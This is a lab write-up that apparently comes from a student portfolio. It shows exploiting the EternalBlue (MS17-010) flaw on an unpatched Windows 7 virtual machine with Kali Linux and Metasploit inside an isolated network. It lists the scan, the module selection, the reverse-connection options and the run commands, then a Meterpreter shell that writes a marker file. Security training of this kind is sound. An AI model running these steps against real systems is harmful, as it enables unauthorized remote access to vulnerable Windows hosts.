# 🔐 EternalBlue Exploit Lab (MS17-010)

**By:** Jason Torres Reyes  
**Objective:** Demonstrate how to exploit the EternalBlue vulnerability using Kali Linux and Metasploit on a Windows 7 target in a controlled virtual environment.

---

## 📁 Lab Setup

**Step 1:** Created two virtual machines in Oracle VirtualBox:
- **Target:** Windows 7 (unpatched)
- **Attacker:** Kali Linux

**Step 2:** Configured an **isolated internal network** on VirtualBox:  
- Subnet: `10.0.0.0/24`  
- Ensures both machines communicate only within this private network.

**Step 3:** Verified the IP of the attacker machine using:
```bash
ifconfig
```

---

## 🛠️ Network Scanning & Exploit Preparation

**Step 4:** Scanned the network to identify live hosts and services:
```bash
nmap -sV -O 10.0.0.0/24
```

**Step 5:** Launched Metasploit Framework:
```bash
msfconsole
```

**Step 6–7:** Searched for the EternalBlue exploit and selected the appropriate module:
```bash
search eternalblue
use 0
```

**Step 8–12:** Set the exploit options:
```bash
set RHOST 10.0.0.3       # Target IP
set LHOST 10.0.0.2       # Attacker IP
set LPORT 87             # Unused port on Kali
options                  # Confirm settings
```

**Step 13:** Ran the exploit:
```bash
run
```

---

## 🎯 Post-Exploitation

**Step 14:** Successfully got a Meterpreter session.

**Step 15–16:** Navigated to the target's file system and opened a shell.

**Step 17:** Created a folder and a file to simulate ethical compromise:
```cmd
cd C:\Users\vboxuser\Documents
mkdir "You_Have_Been_Hacked"
cd "You_Have_Been_Hacked"
echo This machine has been ethically hacked for educational purposes only. > readme.txt
```

**Step 18:** Visually confirmed folder and file creation on the target machine.

---

